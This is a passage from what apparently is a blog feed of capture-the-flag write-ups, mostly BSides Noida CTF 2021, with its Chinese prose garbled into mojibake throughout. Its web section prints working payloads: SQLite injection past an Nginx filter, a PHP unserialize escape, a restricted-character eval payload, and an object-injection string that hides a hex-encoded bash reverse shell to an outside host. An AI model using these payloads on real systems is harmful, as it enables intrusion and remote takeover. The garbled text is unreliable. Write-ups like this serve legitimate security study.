class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;rfc8259_15_4_b1t_v4gu3_1a97a3d3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BSides Noida CTF 2021</title>
      <link href="/zh-CN/posts/6b16e944.html"/>
      <url>/zh-CN/posts/6b16e944.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h3><blockquote><p>Just a place to see list of all challs from bsides noida CTF, maybe some flag too xD<br>Note : Bruteforce is not required.</p></blockquote><p>é¢˜ç›®ç»™å‡ºçš„æ˜¯ä¸€ä¸ª SQLite æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯ Nginx ç¦ç”¨äº†æ‰€æœ‰å­—æ¯ã€‚æ ¹æ®ç»™å‡ºçš„é™„ä»¶å¯çŸ¥æ ¹ç›®å½•ä¸‹æœ‰ <code>karma.db</code>ï¼Œè®¿é—®åˆ° <code>/karma.db</code> å°†å…¶ä¸‹è½½ä¸‹æ¥ã€‚ä½¿ç”¨ SQLite Expert è¯»å–å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628492691729899/778de3c107ceaff1a2882396a0f81a783dd28c4c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4&#125;</span><br></pre></td></tr></table></figure><h3 id="Baby-Web-Revenge"><a href="#Baby-Web-Revenge" class="headerlink" title="Baby Web Revenge"></a>Baby Web Revenge</h3><blockquote><p>So close yet so far</p></blockquote><p>å†æ¥å®¡è§†ä¸€ä¸‹ Nginx çš„è¿‡æ»¤ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($arg_chall_id ~ [A-Za-z_.%])&#123;</span><br><span class="line"><span class="attribute">return</span> <span class="number">500</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®åªçœ‹äº†å‚æ•° chall_idï¼Œä½†æ˜¯å› ä¸ºåç«¯æ˜¯ PHPï¼Œæ‰€ä»¥ chall.id å®é™…ä¸Šä¹Ÿä¼šè¢« PHP è§£ææˆ chall_idã€‚ä½†æ˜¯åˆ° Nginx æ—¶å´ä¸ä¼šè¢«è¿™ä¹ˆå¤„ç†ï¼Œå› æ­¤å¾—ä»¥ç»•è¿‡ Nginx çš„è¿‡æ»¤ã€‚ç»“åˆåç«¯æ˜¯ SQLiteï¼Œä½¿ç”¨å¦‚ä¸‹è½½è·å³å¯è¯»å–ä¿¡æ¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall.id&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(sql),2,3,4,5,6&#x2F;**&#x2F;from&#x2F;**&#x2F;sqlite_master</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹è¡¨ç»“æ„ï¼Œè¿›è€Œå°è¯•è¯»å– flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE CTF(</span><br><span class="line">    id INteger AUTO_INCREMENT,</span><br><span class="line">    title varchar(255) not NULL,</span><br><span class="line">    description varchar(255) not NULL,</span><br><span class="line">    category varchar(255) not NULL,</span><br><span class="line">    author varchar(255) not NULL,</span><br><span class="line">    points int NOT NULL),</span><br><span class="line">CREATE TABLE therealflags(</span><br><span class="line">    id int AUTO_INCREMENT,</span><br><span class="line">    flag varchar(255) not NULL)</span><br></pre></td></tr></table></figure><p>æ„é€ å‡ºå¦‚ä¸‹è½½è·è¯»å– flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall.id&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;flag,2,3,4,5,6&#x2F;**&#x2F;from&#x2F;**&#x2F;therealflags</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4_fr0m_4n_1nt3nd3d_s01ut10nxD&#125;</span><br></pre></td></tr></table></figure><h3 id="wowooo"><a href="#wowooo" class="headerlink" title="wowooo"></a>wowooo</h3><blockquote><p>itâ€™s really interesting<br>Note : Bruteforce is not required.</p></blockquote><p>æ ¹æ®é¡µé¢æºç æ³¨é‡Šçš„æç¤ºæäº¤ GET å‚æ•° <code>debug</code> å³å¯å¾—åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;flag&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;flagcc&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line">$pass&#x3D;&quot;V13tN4m_number_one&quot;;</span><br><span class="line">$pass&#x3D;&quot;Fl4g_in_V13tN4m&quot;;</span><br><span class="line">$ser&#x3D;&#39;a:2:&#123;i:0;s:&#39;.strlen($username).&quot;:\&quot;$username\&quot;;i:1;s:&quot;.strlen($pass).&quot;:\&quot;$pass\&quot;;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$authen &#x3D; unserialize(filter($ser));</span><br><span class="line"></span><br><span class="line">if($authen[1]&#x3D;&#x3D;&#x3D;&quot;V13tN4m_number_one &quot;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#39;debug&#39;])) &#123;</span><br><span class="line">    echo(&quot;PLSSS DONT HACK ME!!!!!!&quot;).PHP_EOL;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file( __FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- debug --&gt;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾æ˜¯å°‘å˜å¤šçš„ååºåˆ—åŒ–é€ƒé€¸ï¼Œé€ƒé€¸ç‚¹åœ¨å˜é‡ username å¤„ç”±å››ä¸ªå­—ç¬¦å˜ä¸ºå…­ä¸ªå­—ç¬¦ã€‚å…ˆæ„é€ å‡ºè¦é€ƒé€¸è¾¾æˆçš„éƒ¨åˆ†ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;i:1;s:19:&quot;V13tN4m_number_one &quot;;&#125;</span><br></pre></td></tr></table></figure><p>ä¸€å…± 34 ä¸ªå­—ç¬¦ï¼Œå› æ­¤æ­¤æ—¶éœ€è¦æ›¿æ¢ 17 æ¬¡æ‰èƒ½å®Œæˆé€ƒé€¸ï¼Œæ„é€ å‡ºå¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:1;s:19:&quot;V13tN4m_number_one &quot;;&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ GET å‚æ•° name å‘èµ·è¯·æ±‚å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;3z_ch4all_46481684185_!!!!!!@!&#125;</span><br></pre></td></tr></table></figure><h3 id="freepoint"><a href="#freepoint" class="headerlink" title="freepoint"></a>freepoint</h3><blockquote><p>i hate php &gt;.&lt;<br>Note : Bruteforce is not required.</p></blockquote><p>é¢˜ç›®ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/system|exec|passthru|shell_exec|pcntl_exec|bin2hex|popen|scandir|hex2bin|[~$.^_`]|\&#x27;[a-z]|\&quot;[a-z0-9]/i&quot;</span>,<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BSides</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$option</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$note</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$option</span> = <span class="string">&quot;no flag&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">        <span class="variable">$note</span> = <span class="string">&quot;flag&#123;flag_phake&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;load();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;option === <span class="string">&quot;no flag&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;flag here ! :)&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;option === <span class="string">&quot;getFlag&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadFlag();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You don&#x27;t need flag ?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">loadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;note) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;name)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (filter(<span class="keyword">$this</span>-&gt;note) == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;note.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;18cm30p !! :&lt; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;load();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctf</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (check(<span class="variable">$ctf</span>)) &#123;</span><br><span class="line">        unserialize(<span class="variable">$ctf</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åªéœ€è¦æ§åˆ¶ option ä¸º getFlagï¼Œname ä¸º admin å³å¯è¿›å…¥åˆ° note çš„æ‰§è¡Œã€‚ç”±äºè¿™é‡Œè¿›è¡Œäº†è¯¸å¤šé™åˆ¶ï¼Œè€ƒè™‘ä½¿ç”¨åå…­è¿›åˆ¶å’Œå­—ç¬¦ä¸²åå‘ç»•è¿‡ã€‚æ„é€ å‡ºå¦‚ä¸‹ payload æ¥è¯»å– PHPINFOã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;BSides&quot;:3:&#123;s:6:&quot;option&quot;;s:7:&quot;getFlag&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;note&quot;;s:27:&quot;eval(strrev(&quot;;)(ofniphp&quot;));&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åœ¨ disable_function å¤„æ²¡æœ‰ç¦ç”¨ä»»ä½•å‡½æ•°ï¼Œå› æ­¤ç›´æ¥ä¸€æŠŠæ¢­åå¼¹ shellã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;BSides&quot;:3:&#123;s:6:&quot;option&quot;;s:7:&quot;getFlag&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;note&quot;;s:139:&quot;eval(strrev(&quot;;))&#39;221362e3030253532333f2031323e283e2633313e283f2073647f2675646f20262e30296d20286371626220236d20286371626&#39;(nib2xeh(metsys&quot;));&quot;;&#125;</span><br></pre></td></tr></table></figure><p>åå¼¹ shell åœ¨ /home ä¸‹è¯»åˆ° fl4g_ne_xxx.txt å³ä¸º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;Fre3_fl4g_f04_y0u_@@55361988!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a>Calculate</h3><blockquote><p>Are you a math prodigy? hehe</p></blockquote><p>æ ¹æ®é¡µé¢æºç ä¸­çš„æç¤ºåŠ ä¸Š ğŸ¶ ä¸º key çš„ GET å‚æ•°å³å¯å¾—åˆ°ç›¸å¯¹å®Œæ•´çš„æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ğŸ¶&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[a-zA-BD-Z!@#%^&amp;*:&#x27;\&quot;|`~\\\\]|3|5|6|9/&quot;</span>,<span class="variable">$payload</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- ?ğŸ¶ --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;VietNam&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$VN</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;VietNam&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (filter(<span class="variable">$VN</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_string(<span class="variable">$VN</span>) || strlen(<span class="variable">$VN</span>) &gt; <span class="number">110</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;18cm30p ??? =)))&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$VN</span> = <span class="string">&quot;echo &quot;</span>.<span class="variable">$VN</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$VN</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;check&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å°±ç›¸å½“äºæ„é€ ä¸€ä¸ªå­—æ¯å’Œéƒ¨åˆ†æ•°å­—çš„é™å®šé•¿åº¦çš„ shellï¼Œå…ˆç”¨ check å‚æ•°çœ‹ä¸€çœ¼ disable_functionsã€‚å‘ç° chr å‡½æ•°å’Œ exec å‡½æ•°ä»ç„¶åœ¨ï¼Œå› æ­¤åªéœ€è¦åˆ©ç”¨ exec å»è¿›è¡Œ RCEï¼Œchr è¿›è¡Œè¢«ç¦ç”¨çš„å­—ç¬¦ç”Ÿæˆå³å¯ã€‚æ„é€ å‡ºå¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=C,<span class="variable">$C</span>=((<span class="number">1</span>/<span class="number">0</span>).C)[<span class="number">2</span>],<span class="variable">$C</span>++,<span class="variable">$C</span>++,<span class="variable">$_</span>.=<span class="variable">$C</span>,<span class="variable">$_</span>.=([].C)[<span class="number">2</span>],<span class="variable">$C</span>=<span class="variable">$_</span>(<span class="number">70</span>-<span class="number">1</span>),(<span class="variable">$C</span>.<span class="variable">$_</span>(<span class="number">120</span>).<span class="variable">$C</span>.C)($&#123;_.<span class="variable">$_</span>(<span class="number">71</span>).<span class="variable">$C</span>.<span class="variable">$_</span>(<span class="number">84</span>)&#125;[_]);</span><br></pre></td></tr></table></figure><p>è½½è·å°†æ‰§è¡Œ GET å‚æ•° _ çš„å€¼ï¼Œå› æ­¤å°†åå¼¹ shell æ”¾åœ¨ GET å‚æ•° _ ä¸­ï¼Œå†å°†è½½è·ä»¥ POST å‚æ•° VietNam æäº¤å³å¯è¾¾æˆç›®çš„ã€‚åœ¨ shell ä¸­è¯»å– /home/fl4g_h1hih1i_xxx.txt å³å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;w0w_gr3at_Th4nk_y0u_f0r_j0in1ng_CTF_!!!!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Farewell"><a href="#Farewell" class="headerlink" title="Farewell"></a>Farewell</h3><blockquote><p>â€œYou might be alone at the momentâ€¦<br>But somedayâ€¦ Youâ€™ll definitely find nakama!<br>No one is born in this world to be alone!â€<br>â€• Eiichiro Oda</p></blockquote><p>æ‹¼å›¾å°æ¸¸æˆï¼Œåœ¨è¯·æ±‚ä¸­å¯ä»¥æ‰¾åˆ°åŸå›¾ï¼Œå¯ä»¥ç›´æ¥è¯»å‡º flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628504234060552/f5027eccc0e5926c867ad5cce52e6d632ebc7b34.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;Th4nk5_f0rpl4y1ng_See_y0u_n3xty34rBy3&#125;</span><br></pre></td></tr></table></figure><h3 id="Psst"><a href="#Psst" class="headerlink" title="Psst"></a>Psst</h3><blockquote><p>Psst! Want to know a secret? Here, take thisâ€¦</p></blockquote><p>ä½¿ç”¨ gzip -d psst.tar.gz å’Œ tar -xf psst.tar ä¾æ¬¡è§£å‹åå†™ä¸ªè„šæœ¬è¿›è¡Œéå†ã€‚è¿™é‡Œä¸èƒ½ä½¿ç”¨ Windows æ¥è¿è¡Œè„šæœ¬ï¼Œå› ä¸ºæœ‰æ–‡ä»¶å¤¹çš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸º <code>.</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">message = <span class="string">&quot;&quot;</span></span><br><span class="line">path = <span class="string">&quot;./chall/Security&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    files = os.listdir(path)</span><br><span class="line">    <span class="built_in">print</span>(files)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(files) == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;files[<span class="number">0</span>]&#125;</span>&quot;</span>, <span class="string">&quot;r&quot;</span>).read().strip()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;txt&quot;</span> <span class="keyword">in</span> files[<span class="number">0</span>]:</span><br><span class="line">        files.reverse()</span><br><span class="line">    message += <span class="string">f&quot;<span class="subst">&#123;files[<span class="number">0</span>]&#125;</span> &quot;</span></span><br><span class="line">    flag += <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;files[<span class="number">1</span>]&#125;</span>&quot;</span>, <span class="string">&quot;r&quot;</span>).read().strip()</span><br><span class="line">    path += <span class="string">f&quot;/<span class="subst">&#123;files[<span class="number">0</span>]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬åå¯ä»¥å¾—åˆ°ä¸€æ®µè¯å’Œ flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSides is a community-based framework for organizing events and informing members of the public about information security. These events are already happening in major cities around the world! We are responsible for organizing an independent BSides event approved in Noida, India. It creates opportunities for people to be present and participate in an intimate environment that promotes collaboration. It is a lively event with discussions, demos, and participants&#39; interactions.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;d1d_y0u_u53_b45h_5cr1pt1ng_6f7220737461636b6f766572666c6f773f&#125;</span><br></pre></td></tr></table></figure><h3 id="My-Artwork"><a href="#My-Artwork" class="headerlink" title="My Artwork"></a>My Artwork</h3><blockquote><p>â€œYou can create art and beauty with a computer.â€ - Steven Levy<br>So, I decided not to use MS Paint anymore and write code instead!<br>Hope you can see my art before the turtle runs away!<br>Heâ€™s pretty fast tbh!<br>PS: Put the flag in BSNoida{} wrapper.</p></blockquote><p>å°†é™„ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨ FMSLogo é€æ¡æŒ‡ä»¤æ‰§è¡Œå³å¯å¾—åˆ°é€šè¿‡ç»˜ç”»è¯»å‡ºå¦‚ä¸‹å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CODE_IS_BEAUTY_BEAUTY_ISCODE</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§æç¤ºå°†å­—ç¬¦ä¸²åŒ…è£¹å³å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;CODE_IS_BEAUTY_BEAUTY_ISCODE&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äº”å±Š XMAN é€‰æ‹”èµ›</title>
      <link href="/zh-CN/posts/7b00520f.html"/>
      <url>/zh-CN/posts/7b00520f.html</url>
      
